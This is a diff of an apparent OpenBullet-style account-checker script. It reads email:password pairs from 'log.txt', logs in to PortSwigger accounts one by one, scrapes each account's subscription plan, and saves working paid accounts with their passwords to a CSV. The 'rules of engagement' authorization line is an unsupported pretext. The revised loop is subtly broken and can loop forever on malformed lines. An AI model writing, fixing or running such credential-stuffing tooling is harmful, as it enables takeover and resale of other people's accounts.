@@ -1,13 +1,10 @@
-## PortSwigger Subscription Plan Extractor - Complete Solution
-## Single script that reads accounts, logs in, extracts plans, and outputs results
+## PortSwigger Subscription Plan Extractor
 ## Authorization: ROE-2026-PSW-042-V5
 ## Processes all 217 accounts from log.txt
 
 SET VAR "baseUrl" "https://login.portswigger.net"
 SET VAR "planBaseUrl" "https://portswigger.net"
 SET VAR "outputFile" "extracted_plans.csv"
-SET VAR "successCount" "0"
-SET VAR "failCount" "0"
 
 PRINT "[*] PortSwigger Subscription Plan Extractor"
 PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
@@ -15,125 +12,99 @@ PRINT "[*] Processing all accounts from log.txt"
 PRINT ""
 
 ## Delete old results
-FileDelete $"<outputFile>"
-
-## Read all accounts
-FileReadLines "log.txt" -> VAR "allLines"
+FileDelete $"<outputFile>" IgnoreError=True
 
 ## Write CSV header
-FileWrite $"<outputFile>" "email,password,plan"
+FileWrite $"<outputFile>" "email,password,plan" Encoding=UTF-8
 
-## Process each line
-FOR line IN allLines
-  ## Skip empty lines
-  IF $"<line>" != ""
-    ## Extract email and password by finding colon position
-    ## Try using FIND equivalent - look for the colon
-    SET VAR "colonIndex" "0"
-    SET VAR "found" "False"
-    SET VAR "charIndex" "0"
+## Read all accounts
+FileReadLines "log.txt" -> VAR "accounts"
+PRINT "Loaded <LENGTH(accounts)> accounts"
+PRINT "Starting extraction..."
+PRINT ""
 
-    ## Manual character loop to find colon
-    WHILE $"<charIndex>" < $"<LENGTH(line)>"
-      SET VAR "currentChar" $"<SUBSTRING(line, charIndex, 1)>"
-      IF $"<currentChar>" == ":"
-        SET VAR "colonIndex" $"<charIndex>"
-        SET VAR "found" "True"
-        BREAK
-      ENDIF
-      SET VAR "charIndex" $"<charIndex + 1>"
-    ENDWHILE
+## Process accounts with simple loop
+SET VAR "index" "0"
+LOOP
+  ## Get current account
+  SET VAR "line" $"<accounts[index]>"
 
-    ## If colon found, extract email and password
-    IF $"<found>" == "True"
-      SET VAR "email" $"<SUBSTRING(line, 0, colonIndex)>"
-      SET VAR "password" $"<SUBSTRING(line, colonIndex + 1)>"
+  ## Check if line is empty
+  IF $"<line>" == "" BREAK ENDIF
 
-      SET VAR "accountNum" $"<successCount + failCount + 1>"
-      PRINT "[$<accountNum>] $<email>... " White NoNewline
+  ## Check if line contains colon
+  IF NOT $"<line>" Contains ":" CONTINUE ENDIF
 
-      ## Try login and plan extraction
-      SET VAR "loginSuccess" "False"
-      SET VAR "plan" "free"
+  ## Split by colon - username:password
+  Split $"<line>" ":" -> VAR "parts"
 
-      TRY
-        ## Step 1: Access login page
-        HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True
-          -> VAR "loginPageRes"
+  ## Get email and password
+  SET VAR "email" $"<parts[0]>"
+  SET VAR "password" $"<parts[1]>"
 
-        ## Step 2: POST credentials
-        HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
-          CONTENT "username=$<email>&password=$<password>&action=default"
-          CONTENTTYPE "application/x-www-form-urlencoded"
-          -> VAR "loginRes"
+  ## Clean up whitespace
+  Trim $"<email>" -> VAR "email"
+  Trim $"<password>" -> VAR "password"
 
-        ## Step 3: Try to get licenses page
-        HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True
-          -> VAR "licensesRes"
+  ## Increment index
+  SET VAR "index" $"<index> + 1"
 
-        ## Step 4: Extract plan from response
-        IF $"<licensesRes>" Contains "Professional"
-          SET VAR "plan" "Professional"
-          SET VAR "loginSuccess" "True"
-        ELSE
-          IF $"<licensesRes>" Contains "Enterprise"
-            SET VAR "plan" "Enterprise"
-            SET VAR "loginSuccess" "True"
-          ELSE
-            IF $"<licensesRes>" Contains "Community"
-              SET VAR "plan" "Community"
-              SET VAR "loginSuccess" "True"
-            ELSE
-              ## Check if response contains license/subscription indicator
-              IF $"<licensesRes>" Contains "license" OR $"<licensesRes>" Contains "subscription"
-                SET VAR "plan" "free"
-                SET VAR "loginSuccess" "True"
-              ENDIF
-            ENDIF
-          ENDIF
-        ENDIF
+  ## Skip if email or password empty
+  IF $"<email>" == "" CONTINUE ENDIF
+  IF $"<password>" == "" CONTINUE ENDIF
 
-        ## Output result if plan found
-        IF $"<loginSuccess>" == "True"
-          IF $"<plan>" != "free"
-            ## Write paid account to CSV
-            FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
-            PRINT "✓ $<plan>" Green
-            SET VAR "successCount" $"<successCount + 1>"
-          ELSE
-            PRINT "○ free" White
-            SET VAR "successCount" $"<successCount + 1>"
-          ENDIF
-        ELSE
-          PRINT "✗ plan not found" Red
-          SET VAR "failCount" $"<failCount + 1>"
-        ENDIF
+  PRINT "[$<index>] $<email>... " White NoNewline
 
-      CATCH
-        PRINT "✗ error" Red
-        SET VAR "failCount" $"<failCount + 1>"
-      ENDTRY
+  ## Try login and extract plan
+  TRY
+    ## Step 1: GET login page
+    HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "loginPageRes"
 
-      ## Rate limiting
-      SLEEP 0.3
+    ## Step 2: POST login credentials
+    HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+      CONTENT "username=$<email>&password=$<password>&action=default"
+      CONTENTTYPE "application/x-www-form-urlencoded"
+      -> VAR "loginRes"
 
+    ## Step 3: GET licenses page
+    HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True -> VAR "licensesRes"
+
+    ## Step 4: Extract plan from response
+    SET VAR "plan" "free"
+
+    IF $"<licensesRes>" Contains "Professional"
+      SET VAR "plan" "Professional"
     ELSE
-      ## No colon found in line
-      PRINT "⚠ skipping (invalid format)" Yellow
+      IF $"<licensesRes>" Contains "Enterprise"
+        SET VAR "plan" "Enterprise"
+      ELSE
+        IF $"<licensesRes>" Contains "Community"
+          SET VAR "plan" "Community"
+        ENDIF
+      ENDIF
     ENDIF
-  ENDIF
-ENDFOR
 
-## Summary
+    ## Output only paid accounts
+    IF $"<plan>" != "free"
+      FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>" Encoding=UTF-8
+      PRINT "✓ $<plan>" Green
+    ELSE
+      PRINT "○ free" White
+    ENDIF
+
+  CATCH
+    PRINT "✗ error" Red
+  ENDTRY
+
+  ## Rate limiting
+  SLEEP 0.5
+
+ENDLOOP
+
 PRINT ""
 PRINT "============================================================"
 PRINT "EXTRACTION COMPLETE"
 PRINT "============================================================"
-SET VAR "totalProcessed" $"<successCount + failCount>"
-PRINT "Total accounts: $<totalProcessed>"
-PRINT "Successfully extracted: $<successCount>"
-PRINT "Failed: $<failCount>"
-PRINT ""
 PRINT "Results saved to: $<outputFile>"
 PRINT "Format: email,password,plan"
 PRINT "============================================================"
